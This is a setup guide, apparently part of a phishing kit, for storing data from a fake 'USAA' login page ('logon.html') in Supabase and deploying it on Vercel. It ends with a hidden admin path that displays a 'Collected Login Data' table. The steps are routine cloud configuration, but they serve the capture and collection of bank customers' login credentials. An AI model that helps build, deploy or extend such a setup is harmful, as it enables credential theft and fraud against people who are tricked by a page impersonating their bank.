# Supabase Setup Instructions

## Step 1: Create Supabase Project

1. Go to https://supabase.com
2. Sign up or log in
3. Click "New Project"
4. Fill in:
   - Project Name: `usaa-login-data` (or your choice)
   - Database Password: (choose a strong password)
   - Region: (choose closest to you)
5. Click "Create new project"
6. Wait for project to be created (~2 minutes)

## Step 2: Get Your Supabase Credentials

1. In your Supabase project dashboard, go to **Settings** → **API**
2. Copy these values:
   - **Project URL** (looks like: `https://xxxxx.supabase.co`)
   - **anon/public key** (long string starting with `eyJ...`)

## Step 3: Create the Database Table

1. In Supabase dashboard, go to **SQL Editor**
2. Click "New query"
3. Copy and paste the contents of `supabase_setup.sql`
4. Click "Run" (or press Cmd/Ctrl + Enter)
5. You should see "Success. No rows returned"

## Step 4: Add Environment Variables to Vercel

1. Go to your Vercel project dashboard
2. Go to **Settings** → **Environment Variables**
3. Add these two variables:
   - **Name**: `SUPABASE_URL`
     **Value**: Your Project URL (e.g., `https://xxxxx.supabase.co`)
   - **Name**: `SUPABASE_ANON_KEY`
     **Value**: Your anon/public key
4. Make sure to select all environments (Production, Preview, Development)
5. Click "Save"

## Step 5: Redeploy on Vercel

1. Go to **Deployments** tab
2. Click the three dots on the latest deployment
3. Click "Redeploy"
4. Or push a new commit to trigger automatic deployment

## Verification

After redeploying, test by:
1. Going to your Vercel URL: `https://your-project.vercel.app/logon.html`
2. Fill out the form and click "Verify"
3. Go to admin panel: `https://your-project.vercel.app/admin-flow-control-secret-2024`
4. You should see your data in the "Collected Login Data" table

## View Data in Supabase

You can also view data directly in Supabase:
1. Go to **Table Editor** in Supabase dashboard
2. Click on `login_data` table
3. You'll see all saved entries

## Fallback Behavior

- If Supabase is not configured, the system will automatically fall back to SQLite (for local development)
- This means your local server will continue to work without Supabase
- Only Vercel deployments need Supabase configured

